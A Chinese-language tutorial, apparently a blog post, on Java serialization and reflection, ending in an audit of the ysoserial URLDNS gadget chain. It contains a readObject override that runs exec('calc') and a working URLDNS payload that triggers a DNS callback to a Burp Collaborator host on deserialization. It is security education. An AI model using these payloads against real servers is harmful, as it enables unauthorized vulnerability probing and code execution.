# JAVA序列化和反序列化

## 概念：

  * Java序列化是指把Java对象转换为字节序列的过程；

  * Java反序列化是指把字节序列恢复为Java对象的过程。

序列化分为两大部分：

  * 序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。
  * 反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。

## 用途：

  * 当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。
  * 所以Java序列化一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。

① 想把内存中的对象保存到一个文件中或者数据库中时候；  
② 想用套接字在网络上传送对象的时候；  
③ 想通过RMI传输对象的时候

一些应用场景，涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。

## 常见协议：

java序列化对应的传输协议：

  * XML&SOAP
  * XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议
  * JSON（Javascript Object Notation）
  * Protobuf

## 序列化和反序列化的实现：

这里我们就通过代码来呈现一下，上面的用途究竟是如何进行的，我们首先构造一个Person的类：

这里我们对重点代码进行一下解释：

### 接口：

#### Serializable 接口：

是 Java 提供的序列化接口，它是一个空接口

    
    
    public interface Serializable {
    }
    

Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。
只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列(不是则会抛出异常)。也就是说，这里我们想要实例化Person这个类，我们后面要添加上Serializable这个接口，才能被序列化为字节。

    
    
    public class Person implements Serializable{}
    
    
    
    import java.io.Serializable;
    
    public class Person implements Serializable {//引用一个序列化的接口
        private String name;
        private int age;
    
        public Person(){
    
        }
        public Person(String name,int age){
            this.name= name;
            this.age=age;
        }
        public String toString(){
            return "Person{" +
                    "name='" + name + '\'' +
                    ", age=" + age +
                    '}';
        }
    }
    

然后假设一个我们需要发送信息的机器，将我们的Person这个类通过序列化为二进制字节以后传输出去：

#### Serializable 接口使用：

通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream
包装 FileOutStream 将数据写入到文件中或者包装 ByteArrayOutStream 将数据写入到内存中。同理，可以通过
ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream
读取出来然后转化为指定的对象即可。

#### Serializable接口特点：

  1. 序列化类的属性没有实现 Serializable 那么在序列化就会报错

  2. 如果要序列化的对象的父类没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的，这样做的目的是重新初始化父类的属性，例如 Animal 因为没有实现序列化接口，因此对应的 color 属性就不会被序列化，因此反序列得到的 color 值就为 null。

![](./img/2140103572875765026.png)

    
    
    import java.io.*;
    
    public class SerializationTest {
        public static void serialize(Object obj) throws IOException{
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
    
        public static void main(String[] args) throws Exception{
            Person person=new Person("aa",22);
            System.out.println(person);
            serialize(person);
        }
    }
    

然后假设一个接收信息的机器，需要将收到的二进制字节反序列化为Person：

    
    
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    
    public class UnserializeTest {
        public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    
        public static void main(String[] args) throws Exception{
            Person person = (Person)unserialize("ser.bin");
            System.out.println(person);
        }
    }
    

### 文件操作流：

#### ObjectOutputStream：

代表对象输出流：

它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。

#### ObjectInputStream：

代表对象输入流：

它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。

## 反序列化的安全问题：

只要服务端对数据进行反序列化，客户端传递类的readObject方法会在代码中自动执行，给予了攻击者在服务器上运行代码的能力

### 攻击形式：

  1. 入口类的readObject直接调用危险方法：

在Person类中直接加入这个readObject方法，调用了危险方法，在将序列化字符串进行反序列化的时候会直接执行readObject里面的命令。

    
        private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException{
            ois.defaultReadObject();
            Runtime.getRuntime().exec("calc");
        }
    

  2. 入口类参数中包含可控类，该类有危险方法，readObject时调用

  3. 入口类参数中包含可控类，该类又调用其他存在危险方法的类，readObject时调用，类比php反序列化

  4. 构造函数/静态代码块等类加载时隐式执行

### 共同条件：

  1. 类要继承Seriailizable才能够进行序列化和反序列化
  2. 入口类特征（重写readObject能够进行命令执行，调用常见的函数如toString，equals等，参数的类型广泛，jdk自带)
  3. 调用链（相同名称，相同类型）
  4. 执行类（攻击类型）

后面会详细讲解这里

# Java反射：

## 官方解析：

[Oracle
官方对反射](https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F8%2Fdocs%2Ftechnotes%2Fguides%2Freflection%2Findex.html)的解释是：

    
    
    Reflection is commonly used by programs which require the ability to examine or
    modify the runtime behavior of applications running in the Java virtual machine.
    This is a relatively advanced feature and should be used only by developers who
    have a strong grasp of the fundamentals of the language. With that caveat in
    mind, reflection is a powerful technique and can enable applications to perform
    operations which would otherwise be impossible.

Java 反射是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法；
并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。

## 理解

### 正射：

既然存在反射，就一定有正射，我们先来理解一下正射时什么意思：我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。

    
    
    Student student = new Student();
    student.doHomework("数学");
    

### 反射：

反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。

    
    
    Class clazz = Class.forName("reflection.Student");
     Method method = clazz.getMethod("doHomework", String.class);
     Constructor constructor = clazz.getConstructor();
     Object object = constructor.newInstance();
     method.invoke(object, "语文");
    

### 作用：

  1. 修改已有对象的属性
  2. 动态生成对象
  3. 动态调用方法
  4. 操作内部类和私有方法

在反序列化漏洞中的作用：

  1. 定制需要的对象
  2. 通过invoke调用除了同名函数以外的函数
  3. 通过Class类创建对象，引入不能序列化的类

## 反射的调用：

Class的理解：

因为一开始对Class理解的不透彻，导致反射机制经常被绕，这里我们来理解一下Class：

在运行过程当中，Java对对象和类的信息识别主要有两种方式：

  * 一种是传统的 **RRTI(运行时类型识别)** ，假设我们在编译期已知道了所有类型，这里就相当于我们上面理解的正射。
  * 第二种就是反射机制，它允许我们在运行时发现和使用类的信息。

**每个类都有一个Class对象**
，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。

### 获取Class类对象：

法一：通过实例化类获得完整的类的原型：

    
    
    Person person = new Person();//实例化对象
    Class c = person.getClass();//获得person对应的Class原型
    

法二：class.forName()获取Class类：

这里其实就属于反射：在代码运行时是通过字符串reflection.person，才知道要操作的对象是谁

    
    
    Class c=Class.forName("reflection.person"); //里面要填:类所在的包名+类名
    

法三：使用类的.class方法

    
    
    Class c=TestReflection.class
    

![](./img/2008686175999708071.png)

### 实例化类对象：

法一：通过Class中的newInstence()方法：

    
    
    Class p=Class.forName("Person");
    Object p1=p.newInstance();
    //这里也有另一种写法,区别是要进行强制类型转化
    Class p=Class.forName("Person");
    Person p1=(Person)p.newInstance();
    

法二：通过Constructor的newInstance()方法：

    
    
    Constructor personconstructor = c.getConstructor(String.class,int.class);//获取person里面的构造函数
    Person p = (Person) personconstructor.newInstance("abc",22);
    System.out.println(p);
    

这里我们要注意一个点，先给出Person类中的代码：

    
    
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.Serializable;
    
    public class Person implements Serializable {
        public String name;
        private int age;
    
        public Person(){
    
        }
        public Person(String name,int age){
            this.name= name;
            this.age=age;
        }
        public String toString(){
            return "Person{" +
                    "name='" + name + '\'' +
                    ", age=" + age +
                    '}';
        }
        private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException{
            ois.defaultReadObject();
            Runtime.getRuntime().exec("calc");
        }
        public void action(String act){
            System.out.println(act);
        }
    }
    

我们在创建Class类对象这里只关注两个地方：

    
    
    public Person(){}//无参构造方法
    public Person(String name,int age){//含参构造方法
        this.name= name;
        this.age=age;
    }
    

### 获取类的构造器：

我们关注上面那段代码中的注释：

newInstence()对应的方法其实就是无参数构造器对应的方法，通过无参的构造器来进行实例化，但是如果类中一旦不存在无参构造器就会出现这样的情况:

![](./img/4741956714366026359.png)  
此时第一种方式就行不通了，所以这时候我们就需要第二种方法了，我们首先通过Class取到Person类的原型以后，通过Constructor中的getConstructor方法取到Person类中含参构造器，然后再设置对应参数类型的原型，所以这里要加上.class，然后通过newInstance对类进行实例化时就可以对属性赋值。

    
    
    Class c=Class.forName("Person");
    Constructor personconstructor = c.getConstructor(String.class,int.class);
    Person p = (Person) personconstructor.newInstance("abc",22);
    

### 获取类的属性：

法一：通过类的原型获取public属性

    
    
    getField(String name)
    Field f=c.getField("name");//括号中对应的参数为属性值
    

法二：获取类的一个全部类型的属性

    
    
    getDeclaredField(String name)
     Field f=c.getDeclaredField("name");
    

当然这里我们也可以通过setAccessiable获取私有属性：

    
    
    Constructor personconstructor = c.getConstructor(String.class,int.class);//获取person里面的构造函数
    Person p = (Person) personconstructor.newInstance("abc",22);
    System.out.println(p);
    Field namefield = c.getDeclaredField("age");//根据变量名获取
    namefield.setAccessible(true);//能够访问私有属性
    namefield.set(p,24);//改变类的对象的值，对应的就是p
    System.out.println(p);
    

![](./img/5716298952875705745.png)  
法三：获取类的全部public类型的属性

    
    
    getFields()
     Field[] f=c.getFields();
    

法四：获取类的全部类型的属性

    
    
    getDeclaredFields()
    Field[] personfields = c.getDeclaredFields();
    for(Field f:personfields){
        System.out.println(f);
    }
    

### 获取类的方法：

法一：获取类的public类型方法

    
    
    getMethod(String name,class[] parameterTypes)
    Method actionmethod = c.getMethod("action",String.class);//要注意这里有两个参数，后面要传入的是方法形参的类型的原型,无参函数就不用填
    

法二：获取类的一个特定任一类型的方法

    
    
    getDeclaredMethod(String name,class[] parameterTypes)
    Method actionmethod = c.getDeclaredMethod("action",String.class);
    actionmethod.setAccessible(true);
    actionmethod.invoke(p,"asdfasdf");
    

法三：获取类的全部public的方法

    
    
    getMethods()
    Class p=Class.forName("test.phone");
    Method[] m=p.getMethods();
    

法四：获取类的全部类型的方法

    
    
    getDeclaredMethods()
    Method[] m=p.getDeclaredMethods();
    

## 完整代码结构：

Person.java:

    
    
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.Serializable;
    
    public class Person implements Serializable {
        public String name;
        private int age;
    
        public Person(){
    
        }
        public Person(String name,int age){
            this.name= name;
            this.age=age;
        }
        public String toString(){
            return "Person{" +
                    "name='" + name + '\'' +
                    ", age=" + age +
                    '}';
        }
        private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException{
            ois.defaultReadObject();
            Runtime.getRuntime().exec("calc");
        }
        public void action(String act){
            System.out.println(act);
        }
    }
    

ReflectionTest.java

    
    
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    
    public class ReflectionTest {
        public static void main(String[] args) throws Exception{
            Person person = new Person();
            Class c = person.getClass();//对应person的原型
            Class k=Person.class;
            Class j=Class.forName("Person");
            System.out.println(c);
            System.out.println(k);
            System.out.println(j);
                //反射就是操作Class
    
                //从原型class里面实例化对象
            /*c.newInstance();*/
            Class p11=Class.forName("Person");
            Person p111=(Person)p11.newInstance();
            System.out.println(p111);
    
            Constructor personconstructor = c.getConstructor(String.class,int.class);//获取person里面的构造函数
            Person p = (Person) personconstructor.newInstance("abc",22);
            System.out.println(p);
                //获取类的属性
    //
            Field[] personfields = c.getDeclaredFields();
            for(Field f:personfields){
                System.out.println(f);
            }
    
    //            Field namefield = c.getDeclaredField("age");//根据变量名获取
    //            namefield.setAccessible(true);//能够访问私有属性
    //            namefield.set(p,24);//改变类的对象的值，对应的就是p
    //            System.out.println(p);
                //调用类的方法
    //            Method[] personmethod = c.getMethods();
    //            for(Method m: personmethod){
    //                System.out.println(m);
    //            }
                Method actionmethod = c.getDeclaredMethod("action",String.class);
                actionmethod.setAccessible(true);
                actionmethod.invoke(p,"asdfasdf");
        }
    }
    

# URLDNS链审计：

ysoserial反序列化工具中的URLDNS的payload：

<https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads>

漏洞简要的挖掘思路：

  * URLDNS主要的作用就在于检测服务器上是否存在反序列化漏洞，如果存在就会发送一个DNS请求，这里所利用的就类似于SSRF的一中形式，所以漏洞的触发点就在URL上面（攻击者有可能找RCE的时候没找到，然后找到了URL上面，能够利用一下上面的SSRF）

### 审计过程：

  * 我们跟进一下URL类看一下：

![](./img/1068424779865182200.png)

  * 可以发现他继承了Serializable，也就可以进行序列化和反序列化，下面我们就要在URL.java中寻找一个常见的函数，进行下一步调用链的追踪(为什么要找常见的呢，因为只有这样我们下面的追踪链的目标才能更大，更能够找到一个能让我们利用的恶意类，如果不存在相同的函数，我们就无法在别的类中找到响应的调用)，所以这里我们找到的是hashCode函数：

![](./img/3857154636104323397.png)  
然后跟进hashCode下的函数我们可以发现：

在URLStreamHandler类中存在这么一个hashCode函数，并且里面存在这样的一串代码：

    
    
    InetAddress addr = getHostAddress(u);//根据域名来获取地址
    

![](./img/1411062203652083529.png)  
也就是说如果我们如果可以调用 **URLStreamHandler类中的hashCode函数（执行类）** 我们就可以得到一个DNS请求。

### 调用结构：

这里其实说到了前面没有说到的反序列化漏洞的利用条件：

    
    
    1. 类要继承Seriailizable才能够进行序列化和反序列化//在URL那里存在一个可以序列化的接口
    2. 入口类特征（重写readObject能够进行命令执行，调用常见的函数如toString，equals等，参数的类型广泛，jdk自带)
    3. 调用链（相同名称，相同类型）
    4. 执行类（攻击类型）//URL类中的hashCode函数
    

我们在这里梳理一下:

    
    
    HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
            //这里不能够发起请求
    hashmap.put(new URL("http://2il5ylcsc7m6l5qofjxawukil9rzfo.burpcollaborator.net"),1);
            //这里把hashcode改回-1
            //通过反射，改变已有对象的属性
    serialize(hashmap);
    

#### 入口类特征：

这里我详细讲解一下入口类的选用，这里序列化为什么会选择hashMap作为入口类：

    
    
    我们上面的反序列化漏洞利用条件里面对入口类特征有这样的一个描述：
    1. 重写readObject能够进行命令执行
    2. 调用常见的函数如toString，equals等
    3. 参数的类型广泛
    4. jdk自带

首先我们来看一下hashMap的结构：

在hashMap中我们可以发现它的参数是以键值对的形式进行传参，所以接收的参数类型非常的广泛，并且有Serializable接口，同时在他的结构中我们发现了重写的readObject因此可以直接执行命令，并且在readObject中还调用了常用的函数hash()，同时还是jdk自带的类，所以非常符合我们所说的入口类特征

![](./img/9056509638627127770.png)

![](./img/5266844449060303972.png)

#### 调用链：

##### 序列化部分：

  1. 我们跟进put会发现put能够调用hash函数：

    
    
    public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
    

  1. 调用到hash，这里我们就能够调用到key对应的hashCode函数，这里的key其实对应的就是：`new URL("[2il5ylcsc7m6l5qofjxawukil9rzfo.burpcollaborator.net](http://2il5ylcsc7m6l5qofjxawukil9rzfo.burpcollaborator.net)")`

    
    
    static final int hash(Object key) {
            int h;
            return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
        }
    

  1. 然后调用到URL类中的hashCode:

    
    
    public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
            hashCode = handler.hashCode(this);
            return hashCode;
        }
    

  1. 最终到达我们的执行类： **URLStreamHandler类中的hashCode函数**

##### 问题：

但是这里存在一个问题：因为我们最后要绕过if，调用的是

    
    
    hashCode = handler.hashCode(this);
    

但是追踪一下if中的hashCode值我们就发现，初始化为-1：

    
    
    private int hashCode = -1;
    

在我们序列化的时候就会执行这个语句从而发送DNS请求，而返回hashCode值就从-1变成了URL的字符串，等到我们反序列化的时候，就无法绕过if语句从而发送DNS请求了，所以这里我们需要将hashCode值进行控制修改，就利用到了反射的知识：这是优化以后的代码：

    
    
    SerializationTest.java
    import java.io.*;
    import java.lang.reflect.Field;
    import java.net.URL;
    import java.util.HashMap;
    
    public class SerializationTest {
        public static void serialize(Object obj) throws IOException{
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
    
        public static void main(String[] args) throws Exception{
    //       Person person=new Person("aa",22);
    //        System.out.println(person);
            HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
    //这里不能够发起请求,把url对象的hashcode改成不是-1
            URL url=new URL("http://2il5ylcsc7m6l5qofjxawukil9rzfo.burpcollaborator.net");//创建一个URL对象
            Class c = url.getClass();//获取到这个对象的原型
            Field hashcodefield = c.getDeclaredField("hashCode");//获取到对象的hashCode属性
            hashcodefield.setAccessible(true);//设置能够访问private属性
            hashcodefield.set(url,1234);//给hashCode赋值为1234
            hashmap.put(url,1);//将我们新建的url对象放入hashMap中，这样才能把我们的URL传进去
    //这里把hashcode改回-1
    //通过反射，改变已有对象的属性
            hashcodefield.set(url,-1);//执行完以后再将属性值改为-1
            serialize(hashmap);//序列化对象
        }
    }
    

这样我们在序列化的时候就不会发送DNS请求，而是在反序列化之后才会：

    
    
    UnserializeTest.java
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    
    public class UnserializeTest {
        public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    
        public static void main(String[] args) throws Exception{
            unserialize("ser.bin");
        }
    
    }
    

![](./img/2122890116652115641.png)

#### 断点调试：

我们在hashCode的if语句下一个断点来看一下反序列化到那里对应的hashCode值为多少：

![](./img/3444023892750844592.png)  
反序列化步骤：

    
    
    入口A：HashMap.java 接收参数O
    目标类B：URL.java
    目标调用B.f(调用函数)
    
    A.readObject->B.f

参考文章：  
<https://juejin.cn/post/6844904025607897096#heading-18>  
[https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=&request_id=137ce9676bec4fd79e7e5656dd9a8d26&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-6-107621010-null-null.268^v1^control&utm_term=java&spm=1018.2226.3001.4450](https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=&request_id=137ce9676bec4fd79e7e5656dd9a8d26&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-6-107621010-null-null.268^v1^control&utm_term=java&spm=1018.2226.3001.4450)

